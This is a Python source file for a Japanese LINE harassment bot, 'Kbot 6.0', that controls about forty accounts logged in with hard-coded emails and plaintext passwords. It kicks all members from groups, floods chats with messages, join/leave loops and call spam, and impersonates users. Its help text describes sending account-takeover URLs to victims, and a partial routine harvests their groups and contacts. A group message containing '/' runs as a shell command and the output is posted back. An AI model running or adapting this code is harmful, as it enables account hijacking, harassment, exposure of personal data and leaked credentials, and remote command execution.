import base64
from linepy import *
import random
import os
import time
from thrift.protocol import TCompactProtocol
from thrift.transport import THttpClient
from ttypes import Message
from ttypes import LoginRequest
import json, requests, LineService
import datetime
import subprocess
import json, codecs

Chordname = "Kbot6.0-Shotgun"
LoginArt = """
====[login now...]===
O  O  OOO    OOO   OOOOO
O O   O  O  O   O    O  
OO    OOO   O   O    O
O O   O  O  O   O    O
O  O  OOO    OOO     O

====[kbot ver.6.0]=====

"""
logo = """
[kbot ver.6.0]
O    O
O  O
OO
O  O
O    O

OOOOO
O    O
OOOOO
O    O
OOOOO

 OOO
O   O
O   O
O   O
 OOO 

OOOOO
  O
  O
  O
  O
"""

settingsOpen = codecs.open("settings.json","r","utf-8")
settings = json.load(settingsOpen)
blacklistOpen = codecs.open("blacklist.json","r","utf-8")
blacklist = json.load(blacklistOpen)
print("パスワード合致、ログインします")
print(LoginArt)
client = LINE('koutamanto@icloud.com','koutamanto1014')
client.log("Auth Token :"+str(client.authToken))
oepoll = OEPoll(client)
k1 = LINE('rkhnuqozmmwfmvysyr@outlook.jp', 'sw123456')
k2 = LINE('jgtgawvengvteyjrrk@outlook.com', 'sw123456')
k3 = LINE('qwcdgydrngvcnqlhti@outlook.jp', 'sw123456')
k4 = LINE('dueogsfsfknfazvsuz@outlook.jp', 'sw123456')
k5 = LINE('aiyqisvmjoujrgwsok@outlook.com', 'sw123456')
k6 = LINE('aaayaysqadffqadwncdqh@outlook.jp', 'sw123456')
k7 = LINE('kruinljikiqusffzaq@outlook.com', 'sw123456')
k8 = LINE('hqukomgsshodzvvidt@outlook.jp', 'sw123456')
k9 = LINE('rtlwvssrfieqjtyrin@outlook.com', 'sw123456')
k10 = LINE('degczqiuoczuelyord@outlook.jp', 'sw123456')
k11 = LINE('qyfothicygyniwslys@outlook.com', 'sw123456')
k12 = LINE('qgmfejdzwqeeslamwf@outlook.com', 'sw123456')
k13 = LINE('aaagvqflfvtnhjkkzmsfm@outlook.jp', 'sw123456')
k14 = LINE('asdasdasd@sute.jp', 'sw123456')
k15 = LINE('itfkmgyewjgyuijrjv@outlook.com', 'sw123456')
k16 = LINE('koutasabu114@gmail.com','kouta1014')
k17 = LINE('koutasabu6@gmail.com','kouta1014')
k18 = LINE('koutasabu758@gmail.com','kouta1014')
k19 = LINE('koutasabu042@gmail.com','kouta1014')
k20 = LINE('nyappibot4@gmail.com','koutamanato1')
k21 = LINE('koutasabu068@gmail.com','kouta1014')
k22 = LINE("kicker1@prin.be","you1209")
k23 = LINE("kicker3@prin.be","you1209")
k24 = LINE("kicker2@prin.be","you1209")
k25 = LINE("kicker4@prin.be","you1209")
k26 = LINE("kicker5@prin.be","you1209")
k27 = LINE("kicker6@prin.be","you1209")
k28 = LINE("kicker7@prin.be","you1209")
k29 = LINE("kicker8@prin.be","you1209")
k30 = LINE("kicker9@prin.be","you1209")
k31 = LINE('ganyonyo27@eay.jp','kouta1014')
k32 = LINE('koutasabu068@gmail.com','kouta1014')
k33 = LINE('ziregaha@ponp.be','kouta1014')
k34 = LINE('pahe782@risu.be','kouta1014')
k35 = LINE('nyappibot3@gmail.com','koutamanato1')
k36 = LINE('nokonoko101466@gmail.com','kouta1014')
k37 = LINE('nyappibot5@gmail.com','koutamanato1')
k38 = LINE('nyappibot6@gmail.com','koutamanato1')
k39 = LINE('nyappibot7@gmail.com','koutamanato1')
fightermids = []
infnity = 0;
KAC = [client,k1,k2,k3,k4,k5,k6,k7,k8,k9,k10,k11,k12,k13,k14,k15,k16,k17,k18,k19,k20,k21,k22,k23,k24,k25,k26,k27,k28,k29,k30,k31,k32,k33,k34,k35,k36,k37,k38,k39]
clMID = client.profile.mid
kMID = k1.profile.mid
k2MID = k2.profile.mid
k3MID = k3.profile.mid
k4MID = k4.profile.mid
k5MID = k5.profile.mid
k6MID = k6.profile.mid
k7MID = k7.profile.mid
k8MID = k8.profile.mid
k9MID = k9.profile.mid
k10MID = k10.profile.mid
k11MID = k11.profile.mid
k12MID = k12.profile.mid
k13MID = k13.profile.mid
k14MID = k14.profile.mid
k15MID = k15.profile.mid
k16MID = k16.profile.mid
k17MID = k17.profile.mid
k18MID = k18.profile.mid
k19MID = k19.profile.mid
k20MID = k20.profile.mid
k21MID = k21.profile.mid
k22MID = k22.profile.mid
k23MID = k23.profile.mid
k24MID = k24.profile.mid
k25MID = k25.profile.mid
k26MID = k26.profile.mid
k27MID = k27.profile.mid
k28MID = k28.profile.mid
k29MID = k29.profile.mid
k30MID = k30.profile.mid
k31MID = k31.profile.mid
k32MID = k32.profile.mid
k33MID = k33.profile.mid
k34MID = k34.profile.mid
k35MID = k35.profile.mid
k36MID = k36.profile.mid
k37MID = k37.profile.mid
k38MID = k38.profile.mid
k39MID = k39.profile.mid
KMIDS = [clMID,kMID,k2MID,k3MID,k4MID,k5MID,k6MID,k7MID,k8MID,k9MID,k10MID,k11MID,k12MID,k13MID,k14MID,k15MID,k16MID,k17MID,k18MID,k19MID,k20MID,k21MID,k22MID,k23MID,k24MID,k25MID,k26MID,k27MID,k28MID,k29MID,k30MID,k31MID,k32MID,k33MID,k34MID,k35MID,k36MID,k37MID,k38MID,k39MID]
authnum = {
"Creator":0, 
"Deveroper":1, 
"Admin":2, 
"Normal":3, 
"lite":4}
def helpMessage():
	helpMessage = """
╔══✟HELP✟══
║help➣このヘルプメッセージを表示します
╠❃aflc❃➣(All Friend List Contact)全友達の連絡先を送信します(※友達が多い方は要注意)
╠❃tlmacro❃➣50発タイムラインマクロを撃ちます
╠❃gi❃➣(Group Info)グループの内部的な情報を表示します
╠❃ka❃➣(Kick All)全蹴りします
╠❃info @❃➣メンションした相手の詳細な情報を表示します
╠❃member❃➣メンバーを確認します
╠❃start❃➣ストップウォッチを起動します
╠❃stop❃➣ストップウォッチを停止しま
╠❃God❃➣ゴッドモードに入りグループから退会されなくなります（開発中）
╠❃leave❃➣退会します
╠❃cg❃➣(Create Group)
╠❃ip❃➣IPアドレスから相手の国籍を取得します
╠❃乗っ取りうらる作成❃➣乗っ取りうらるをコマンドプロンプト上に生成します
╠❃join❃➣キッカーを参加させます※キッカーが必要です、このバージョンでは使用できません
╠❃dkjoin❃➣予め設定したトークン(Auth Token)から乗っ取り済みのアカウントをキッカーとして参加させます(Destroy Kicker)
╠❃go❃➣キッカーまたは乗っ取り済みのキッカーで全蹴りします
╠❃作者情報❃➣半botの作者のプロフィールをテキストファイルで送信します
╠❃enghelp❃➣Display the English version help message
╠❃mimic @❃➣メンションした相手の名前・トプ画・ホーム画などをクローンし、成りすまします
╠═[乗っ取り]══
❃乗っ取りについて❃
乗っ取りうらるを生成するとコマンドプロンプト上にURLが表示されます。
何かしらの手段（TwitterのDM等)を使用しスマホのLINEで送信します。
ターゲットが踏んだ場合乗っ取り成功です。
詳しい機能は
╠❃乗っ取りヘルプ❃コマンドで確認できます
╠═══[機能]══
╠❃コードネーム表示❃➣コードネームを表示します
╠☬CommandPromptChatIndicator☬➣コマンドプロンプト上でチャット情報を監視します(ccmとの併用が便利)
╠❃ccm❃➣(CommandPrompt Chat Mode)ターミナル（コマンドプロンプト）内でメッセージを入力・送信します
╠☬/コマンド名☬➣(リモートシェル機能）コマンドプロンプトのコマンドを実行し、出力結果を送信します
╠═[Thunder Storm]═
╠═[ver.6.0]═
╚[Created by kouta] 

	"""
	return helpMessage

def EnglishHelpMessage():
	EnglishHelpMessage = """
╔══✟HELP✟══
║enghelp➣Display this message
╠❃aflc❃➣(All Friend List Contact)send your all friends list
╠❃tlmacro❃➣send 50 timeline posts(macro)
╠❃gi❃➣(Group Info)Display system info of your group
╠❃ka❃➣kick all members
╠❃leave❃➣leave this group
╠❃ccm❃➣(CommandPrompt Chat Mode)input and send your messages on your terminal(cmd)
╠❃cg❃➣Create Group
╠❃word❃➣Display Quotes
╠❃info @❃➣
╠═══[機能]══
╠☬CommandPromptChatIndicator☬➣Display the receive messages,sender name etc... on your cmd
╠═[ver.6.0]═
╚[Created by kouta] 
	"""
	return EnglishHelpMessage

word1 = """THE QUIETER YOU BECOME,\n
MORE YOU CAN HEAR\n
~Ram Dass"""
word2 = """You only live once,\n
but if you do it right,\n
once is enough"""
word3 = """Only I can change my life.\n
No one can do it for me."""
word4 = """Change before you have to."""

words = [word1,word2,word3,word4]

def SEND_MESSAGE(op):
	msg = op.message

	text = msg.text
	to = msg.to
	me = "u1505299bc3e6d961c34321d34e2aa415"
	mids = client.getAllContactIds()
	sender = msg._from
	tlcount = 0
	kacount = 0
	count = 1
	fightermids = []
	fighternames = ""
	try:
		if op.type == 0:
			return
		if op.type == 25:
			if msg.toType == 2:
				g = client.getGroup(op.message.to)
				print ("sended:".format(str(g.name)) + str(msg.text))
			else:
				print ("sended:" + str(msg.text))
		if op.type == 26:
			msg =op.message
			pop = client.getContact(msg._from)
			print ("replay:"+pop.displayName + ":" + str(msg.text))
		if op.type == 18:
			print(op.param1)
			print(op.param2)
			print(op.param3)
		if op.type == 19:
			if settigs["protect"] == True:
				G = ki.getGroup(op.param1)
				ginfo = ki.getGroup(op.param1)
				ki.kickoutFromGroup(op.param1,[op.param2])
				G.preventedJoinByTicket = False
				ki.updateGroup(G)
				invsend = 0
				Ticket = ki.reissueGroupTicket(op.param1)
				client.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki2.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki3.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki4.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki5.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki6.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki7.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki8.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki9.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki10.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki11.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki12.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki13.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki14.acceptGroupInvitationByTicket(op.param1,Ticket)
				ki15.acceptGroupInvitationByTicket(op.param1,Ticket)
				G = ki.getGroup(op.param1)
				G.preventedJoinByTicket = True
				ki.updateGroup(G)
				G.preventedJoinByTicket(G)
		if op.type == 22:
			if settings["invprotect"] == True:
				client.sendMessage(to,"警告:危険性のある招待を検知")
				client.kickoutFromGroup(op.param1,op.param2)
				client.cancelGroupInvitation(op.param1,op.param3)
		elif msg.contentType == 13:
			if settings["contact"] == True:
				print(msg.contentMetadata)
				mi_d = msg.contentMetadata['mid']
				minfo = client.getContact(mi_d)
				print(str(minfo))
				print(str(minfo.settings))
				client.sendMessage(to,"名前:" + str(minfo.displayName))
				client.sendMessage(to,"ステータスメッセージ:" + str(minfo.statusMessage))
				client.sendMessage(to,"mid:" + str(mi_d))
		if msg.contentType == 0:
			groupinfo = client.getGroupWithoutMembers(to)
			contact = client.getContact(sender)
			txt = '[%s] %s[location:%s]' % (contact.displayName, text, msg.location)
			print(txt)
			cmd = "title %s"%(groupinfo.name)
			os.system(cmd)
		elif msg.contentType == 13:
			mi_d = msg.contentMetadata[0]
			minfo = client.getContact(mi_d)
			print(str(minfo))
			print(str(minfo.settings))
			client.sendContact(to,mi_d)
			client.sendMessage(to,"名前:" + str(minfo.displayName))
			client.sendMessage(to,"ステータスメッセージ:" + str(minfo.statusMessage))
			client.sendMessage(to,"mid:" + str(mi_d))
			client.sendMessage(to,"Email:" + str(minfo.email))
			client.sendMessage(to,"setting:" + str(minfo.settings))
			client.sendMessage(to,"Phone:" + str(minfo.phone))
			client.sendImageWithURL(to,"http://dl.profile.line-cdn.net/" + minfo.pictureStatus)
			cover = client.getProfileCoverURL(mi_d)
			client.sendImageWithURL(to,cover)
			time = datetime.datetime.fromtimestamp(int(minfo.createdtime))
			client.sendMessage(to,time)
		elif msg.contentType == 7:
			if msg.contentMetadata == {'STKTXT': '[スタンプ]', 'STKVER': '1', 'STKID': '219895', 'STKPKGID': '2000010'}:
				G = client.getGroup(msg.to)
				ginfo = client.getGroup(msg.to)
				G.preventedJoinByTicket = False
				client.updateGroup(G)
				invsend = 0
				Ticket = client.reissueGroupTicket(msg.to)
				ki.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki2.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki3.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki4.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki5.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki6.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki7.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki8.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki9.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki10.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki11.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki12.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki13.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki14.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki15.acceptGroupInvitationByTicket(msg.to,Ticket)
				G = client.getGroup(msg.to)
				G.preventedJoinByTicket = True
				client.updateGroup(G)
				G.preventedJoinByTicket(G)
				client.updateGroup(G)			
			if msg.contentMetadata == {'STKTXT': '[スタンプ]', 'STKVER': '1', 'STKID': '219894', 'STKPKGID': '2000010'}:
				group=client.getGroup(to)
				MM = [contact.mid for contact in group.members]
				for x in group.members:
					try:
						MM.remove(x)
					except:
						pass
						for k in MM:
							ki.kickoutFromGroup(to,[k])
							ki2.kickoutFromGroup(to,[k])
							ki3.kickoutFromGroup(to,[k])
							ki4.kickoutFromGroup(to,[k])
							ki5.kickoutFromGroup(to,[k])
							ki6.kickoutFromGroup(to,[k])
							ki7.kickoutFromGroup(to,[k])
							ki8.kickoutFromGroup(to,[k])
							ki9.kickoutFromGroup(to,[k])
							ki10.kickoutFromGroup(to,[k])
							ki11.kickoutFromGroup(to,[k])
							ki12.kickoutFromGroup(to,[k])
							ki13.kickoutFromGroup(to,[k])
							ki14.kickoutFromGroup(to,[k])
							ki15.kickoutFromGroup(to,[k])
			if msg.contentMetadata == {'STKTXT': '[スタンプ]', 'STKVER': '1', 'STKID': '219887', 'STKPKGID': '2000010'}:
				ki.leaveGroup(msg.to)
				ki2.leaveGroup(msg.to)
				ki3.leaveGroup(msg.to)
				ki4.leaveGroup(msg.to)
				ki5.leaveGroup(msg.to)
				ki6.leaveGroup(msg.to)
				ki7.leaveGroup(msg.to)
				ki8.leaveGroup(msg.to)
				ki9.leaveGroup(msg.to)
				ki10.leaveGroup(msg.to)
				ki11.leaveGroup(msg.to)
				ki12.leaveGroup(msg.to)
				ki13.leaveGroup(msg.to)
				ki14.leaveGroup(msg.to)
				ki15.leaveGroup(msg.to)
			if msg.contentMetadata == {'STKTXT': '[スタンプ]', 'STKVER': '1', 'STKID': '219890', 'STKPKGID': '2000010'}:
				G = client.getGroup(msg.to)
				ginfo = client.getGroup(msg.to)
				G.preventedJoinByTicket = False
				client.updateGroup(G)
				invsend = 0
				Ticket = client.reissueGroupTicket(msg.to)
				while(True):
					ki.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki2.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki3.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki4.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki5.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki6.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki7.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki8.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki9.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki10.acceptGroupInvitationByTicket(msg.to,Ticket)
					ki.leaveGroup(msg.to)
					ki2.leaveGroup(msg.to)
					ki3.leaveGroup(msg.to)
					ki4.leaveGroup(msg.to)
					ki5.leaveGroup(msg.to)
					ki6.leaveGroup(msg.to)
					ki7.leaveGroup(msg.to)
					ki8.leaveGroup(msg.to)
					ki9.leaveGroup(msg.to)
					ki10.leaveGroup(msg.to)
			if msg.contentMetadata != 0:
				print(msg.contentMetadata)
		if text.lower() == 'help':
			helpmessage = helpMessage()
			client.sendMessage(to,str(helpmessage))	
		elif text.lower() == 'all':
			account = client.getContact(mids[1])
			client.sendMessage(to,str(account))
		elif text.lower() == 'gift':
			client.sendMessage(msg.to,text = None,contentMetadata={'PRDID': 'a0768339-c2d3-4189-9653-2909e9bb6f58','PRDTYPE': 'THEME','MSGTPL': '5'},contentType = 9)
			time.sleep(5)
#========[保護関連]=============
		elif text.lower() == '連絡先オン':
			if settings["contact"] == False:
				settings["contact"] = True
				client.sendMessage(to,"連絡先情報表示機能をオンにしました")
			elif settings["contact"] == True:
				client.sendMessage(to,"連絡先情報表示機能はすでにオンです")
		elif text.lower() == '連絡先オフ':
			if settings["contact"] == True:
				settings["contact"] = False
				client.sendMessage(to,"連絡先情報表示機能をオフにしました")
			elif settings["contact"] == False:
				client.sendMessage(to,"連絡先情報表示機能はすでにオフです")
		elif text.lower() == '蹴り保護オン':
			if settings["protect"] == False:
				settings["protect"] = True
				client.sendMessage(to,"蹴り保護をオンにしました")
			elif settings["protect"] == True:
				client.sendMessage(to,"蹴り保護はすでにオンです")
		elif text.lower() == '蹴り保護オフ':
			if settings["protect"] == True:
				settings["protect"] = False
				client.sendMessage(to,"蹴り保護をオフにしました")
			elif settings["protect"] == False:
				client.sendMessage(to,"蹴り保護はすでにオフです")
		elif text.lower() == '招待保護オン':
			if settings["invprotect"] == False:
				settings["invprotect"] = True
				client.sendMessage(to,"招待保護をオンにしました")
			elif settings["invprotect"] == True:
				client.sendMessage(to,"招待保護はすでにオンです")
		elif text.lower() == '招待保護オフ':
			if settings["invprotect"] == True:
				settings["invprotect"] = False
			elif settings["invprotect"] == False:
				client.sendMessage(to,"招待保護はすでにオフです")
		elif "マクロ" in msg.text:
			cmd = msg.text.split(':') 
			if cmd[0] == 'マクロ':
				num = int(cmd[1])
				for x in range(0,num):
					client.sendMessage(msg.to,(str(cmd[2])))
					ki.sendMessage(msg.to,(str(cmd[2])))
					ki2.sendMessage(msg.to,(str(cmd[2])))
					ki3.sendMessage(msg.to,(str(cmd[2])))
					ki4.sendMessage(msg.to,(str(cmd[2])))
					ki5.sendMessage(msg.to,(str(cmd[2])))
					ki6.sendMessage(msg.to,(str(cmd[2])))
					ki7.sendMessage(msg.to,(str(cmd[2])))
					ki8.sendMessage(msg.to,(str(cmd[2])))
					ki9.sendMessage(msg.to,(str(cmd[2])))
					ki10.sendMessage(msg.to,(str(cmd[2])))
					ki11.sendMessage(msg.to,(str(cmd[2])))
					ki12.sendMessage(msg.to,(str(cmd[2])))
					ki13.sendMessage(msg.to,(str(cmd[2])))
					ki14.sendMessage(msg.to,(str(cmd[2])))
					ki15.sendMessage(msg.to,(str(cmd[2])))
				client.sendMessage(msg.to,(str(cmd[1]))
				+'回'+str(cmd[2])+'を送信しました')
		elif text.lower() == '便意全開':
			mc = 0
			while(mc != 50):
				client.sendMessage(to,"トイレ行きたい")
				k1.sendMessage(to,"トイレ行きたい")
				k2.sendMessage(to,"トイレ行きたい")
				k3.sendMessage(to,"トイレ行きたい")
				k4.sendMessage(to,"トイレ行きたい")
				k5.sendMessage(to,"トイレ行きたい")
				k6.sendMessage(to,"トイレ行きたい")
				k7.sendMessage(to,"トイレ行きたい")
				k8.sendMessage(to,"トイレ行きたい")
				k9.sendMessage(to,"トイレ行きたい")
				k10.sendMessage(to,"トイレ行きたい")
				k11.sendMessage(to,"トイレ行きたい")
				k12.sendMessage(to,"トイレ行きたい")
				k13.sendMessage(to,"トイレ行きたい")
				k14.sendMessage(to,"トイレ行きたい")
				k15.sendMessage(to,"トイレ行きたい")
				k16.sendMessage(to,"トイレ行きたい")
				k17.sendMessage(to,"トイレ行きたい")
				k18.sendMessage(to,"トイレ行きたい")
				k19.sendMessage(to,"トイレ行きたい")
				k20.sendMessage(to,"トイレ行きたい")
				k21.sendMessage(to,"トイレ行きたい")
				k22.sendMessage(to,"トイレ行きたい")
				k23.sendMessage(to,"トイレ行きたい")
				k24.sendMessage(to,"トイレ行きたい")
				k25.sendMessage(to,"トイレ行きたい")
				k26.sendMessage(to,"トイレ行きたい")
				k27.sendMessage(to,"トイレ行きたい")
				k28.sendMessage(to,"トイレ行きたい")
				k29.sendMessage(to,"トイレ行きたい")
				k30.sendMessage(to,"トイレ行きたい")
				mc = mc + 1
		elif "/spamcall" in msg.text:
			targets = []
			key = eval(msg.contentMetadata["MENTION"])
			key["MENTIONEES"][0]["M"]
			for x in key["MENTIONEES"]:
				targets.append(x["M"])
			proses = text.split(":")
			strnum = text.replace(proses[0] + ":","")
			num =  int(strnum)
			group = client.getGroup(to)
			client.sendMessage(msg.to, "[成功] {} 回通話招待しました".format(str(num)))
			if num <= 1000:
				for x in range(num):
					try:
						client.acquireGroupCallRoute(msg.to)
						client.inviteIntoGroupCall(to, contactIds=targets)
					except Exception as e:
						client.sendMessage(msg.to,str(e))
			else:
				client.sendMessage(msg.to,"回数が多すぎるよ")
		elif text.lower() == 'join':
			G = client.getGroup(msg.to)
			ginfo = client.getGroup(msg.to)
			G.preventedJoinByTicket = False
			client.updateGroup(G)
			invsend = 0
			Ticket = client.reissueGroupTicket(msg.to)
			k1.acceptGroupInvitationByTicket(msg.to,Ticket)
			k2.acceptGroupInvitationByTicket(msg.to,Ticket)
			k3.acceptGroupInvitationByTicket(msg.to,Ticket)
			k4.acceptGroupInvitationByTicket(msg.to,Ticket)
			k5.acceptGroupInvitationByTicket(msg.to,Ticket)
			k6.acceptGroupInvitationByTicket(msg.to,Ticket)
			k7.acceptGroupInvitationByTicket(msg.to,Ticket)
			k8.acceptGroupInvitationByTicket(msg.to,Ticket)
			k9.acceptGroupInvitationByTicket(msg.to,Ticket)
			k10.acceptGroupInvitationByTicket(msg.to,Ticket)
			k11.acceptGroupInvitationByTicket(msg.to,Ticket)
			k12.acceptGroupInvitationByTicket(msg.to,Ticket)
			k13.acceptGroupInvitationByTicket(msg.to,Ticket)
			k14.acceptGroupInvitationByTicket(msg.to,Ticket)
			k15.acceptGroupInvitationByTicket(msg.to,Ticket)
			k16.acceptGroupInvitationByTicket(msg.to,Ticket)
			k17.acceptGroupInvitationByTicket(msg.to,Ticket)
			k18.acceptGroupInvitationByTicket(msg.to,Ticket)
			k19.acceptGroupInvitationByTicket(msg.to,Ticket)
			k20.acceptGroupInvitationByTicket(msg.to,Ticket)
			k21.acceptGroupInvitationByTicket(msg.to,Ticket)
			k22.acceptGroupInvitationByTicket(msg.to,Ticket)
			k23.acceptGroupInvitationByTicket(msg.to,Ticket)
			k24.acceptGroupInvitationByTicket(msg.to,Ticket)
			k25.acceptGroupInvitationByTicket(msg.to,Ticket)
			k26.acceptGroupInvitationByTicket(msg.to,Ticket)
			k27.acceptGroupInvitationByTicket(msg.to,Ticket)
			k28.acceptGroupInvitationByTicket(msg.to,Ticket)
			k29.acceptGroupInvitationByTicket(msg.to,Ticket)
			k30.acceptGroupInvitationByTicket(msg.to,Ticket)
			k31.acceptGroupInvitationByTicket(msg.to,Ticket)
			k32.acceptGroupInvitationByTicket(msg.to,Ticket)
			k33.acceptGroupInvitationByTicket(msg.to,Ticket)
			k34.acceptGroupInvitationByTicket(msg.to,Ticket)
			G = client.getGroup(msg.to)
			G.preventedJoinByTicket = True
			client.updateGroup(G)
			G.preventedJoinByTicket(G)
			client.updateGroup(G)
		elif text.lower() == 'bye':
			k1.leaveGroup(msg.to)
			k2.leaveGroup(msg.to)
			k3.leaveGroup(msg.to)
			k4.leaveGroup(msg.to)
			k5.leaveGroup(msg.to)
			k6.leaveGroup(msg.to)
			k7.leaveGroup(msg.to)
			k8.leaveGroup(msg.to)
			k9.leaveGroup(msg.to)
			k10.leaveGroup(msg.to)
			k11.leaveGroup(msg.to)
			k12.leaveGroup(msg.to)
			k13.leaveGroup(msg.to)
			k14.leaveGroup(msg.to)
			k15.leaveGroup(msg.to)
			k16.leaveGroup(msg.to)
			k17.leaveGroup(msg.to)
			k18.leaveGroup(msg.to)
			k19.leaveGroup(msg.to)
			k20.leaveGroup(msg.to)
			k21.leaveGroup(msg.to)
			k22.leaveGroup(msg.to)
			k23.leaveGroup(msg.to)
			k24.leaveGroup(msg.to)
			k25.leaveGroup(msg.to)
			k26.leaveGroup(msg.to)
			k27.leaveGroup(msg.to)
			k28.leaveGroup(msg.to)
			k29.leaveGroup(msg.to)
			k30.leaveGroup(msg.to)
			k31.leaveGroup(msg.to)
			k32.leaveGroup(msg.to)
			k33.leaveGroup(msg.to)
			k34.leaveGroup(msg.to)
		elif text.lower() == '点呼':
			k1.sendMessage(to,"kicker1、正常稼働しています")
			k2.sendMessage(to,"kicker2、正常稼働しています")
			k3.sendMessage(to,"kicker3、正常稼働しています")
			k4.sendMessage(to,"kicker4、正常稼働しています")
			k5.sendMessage(to,"kicker5、正常稼働しています")
			k6.sendMessage(to,"kicker6、正常稼働しています")
			k7.sendMessage(to,"kicker7、正常稼働しています")
			k8.sendMessage(to,"kicker8、正常稼働しています")
			k9.sendMessage(to,"kicker9、正常稼働しています")
			k10.sendMessage(to,"kicker10、正常稼働しています")
			k11.sendMessage(to,"kicker11、正常稼働しています")
			k12.sendMessage(to,"kicker12、正常稼働しています")
			k13.sendMessage(to,"kicker13、正常稼働しています")
			k14.sendMessage(to,"kicker14、正常稼働しています")
			k15.sendMessage(to,"kicker15、正常稼働しています")
			k16.sendMessage(to,"kicker16、正常稼働しています")
			k17.sendMessage(to,"kicker17、正常稼働しています")
			k18.sendMessage(to,"kicker18、正常稼働しています")
			k19.sendMessage(to,"kicker19、正常稼働しています")
			k20.sendMessage(to,"kicker20、正常稼働しています")
			k21.sendMessage(to,"kicker21、正常稼働しています")
			k22.sendMessage(to,"kicker22、正常稼働しています")
			k23.sendMessage(to,"kicker23、正常稼働しています")
			k24.sendMessage(to,"kicker24、正常稼働しています")
			k25.sendMessage(to,"kicker25、正常稼働しています")
			k26.sendMessage(to,"kicker26、正常稼働しています")
			k27.sendMessage(to,"kicker27、正常稼働しています")
			k28.sendMessage(to,"kicker28、正常稼働しています")
			k29.sendMessage(to,"kicker29、正常稼働しています")
			k30.sendMessage(to,"kicker30、正常稼働しています")
			k31.sendMessage(to,"kicker31、正常稼働しています")
			k32.sendMessage(to,"kicker32、正常稼働しています")
			k33.sendMessage(to,"kicker33、正常稼働しています")
			k34.sendMessage(to,"kicker34、正常稼働しています")
			k35.sendMessage(to,"kicker35、正常稼働しています")
			k36.sendMessage(to,"kicker36、正常稼働しています")
			k37.sendMessage(to,"kicker37、正常稼働しています")
			k38.sendMessage(to,"kicker38、正常稼働しています")
			k39.sendMessage(to,"kicker39、正常稼働しています")
			client.sendMessage(to,"全kicker、正常稼働")			
		elif text.lower() == 'spam':
			G = client.getGroup(msg.to)
			ginfo = client.getGroup(msg.to)
			G.preventedJoinByTicket = False
			client.updateGroup(G)
			invsend = 0
			Ticket = client.reissueGroupTicket(msg.to)
			while(True):
				ki.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki2.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki3.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki4.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki5.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki6.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki7.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki8.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki9.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki10.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki11.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki12.acceptGroupInvitationByTicket(msg,to,Ticket)
				ki13.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki14.acceptGroupInvitationByTicket(msg.to,Ticket)
				ki15.acceptGroupInvitationByTicket(msg,to,Ticket)
				ki.leaveGroup(msg.to)
				ki2.leaveGroup(msg.to)
				ki3.leaveGroup(msg.to)
				ki4.leaveGroup(msg.to)
				ki5.leaveGroup(msg.to)
				ki6.leaveGroup(msg.to)
				ki7.leaveGroup(msg.to)
				ki8.leaveGroup(msg.to)
				ki9.leaveGroup(msg.to)
				ki10.leaveGroup(msg.to)
				ki11.leaveGroup(msg.to)
				ki12.leaveGroup(msg.to)
				ki13.leaveGroup(msg.to)
				ki14.leaveGroup(msg.to)
				ki15.leaveGroup(msg.to)
		elif text.lower() == 'コードネーム表示':
			client.sendMessage(to,Chordname)
			client.sendMessage(to,"最新版KBOTです")
			print(contact)
		elif ("/" in msg.text):
			if msg.toType == 2:
				inp = "/"
				inp = msg.text.replace("/","")
				res = subprocess.check_output(inp, stderr=subprocess.STDOUT, shell=True)
				client.sendMessage(to,"check_output() result: \n" + res.decode('shift-jis'))
		elif text.lower() == 'cg':
			client.createGroup("test",str(mids))
		elif msg.text.lower().startswith('mk '):
			targets = []
			key = eval(msg.contentMetadata["MENTION"])
			key["MENTIONEES"][0]["M"]
			for x in key["MENTIONEES"]:
				targets.append(x["M"])
			for target in targets:
				try:
					#client.sendMessage(to,"Fuck you")
					client.kickoutFromGroup(msg.to,[target])
					client.sendMessage(msg.to,"メンションキックを実行しましたｗｗ")
				except:
					client.sendMessage(to,"Error")
		elif text.lower() == '偵察うらる作成':
			s = LINE()
			gids = s.getGroupIdsJoined()
			sgids = s.getGroups(gids)
			sgmids = sgids.mid
			sids = s.getAllContactIds()
			for sid in sids:
				contact = s.getcontact(sid)
				sname = contact.displayName
				smid = contact.mid
				status = contact.statusMessage
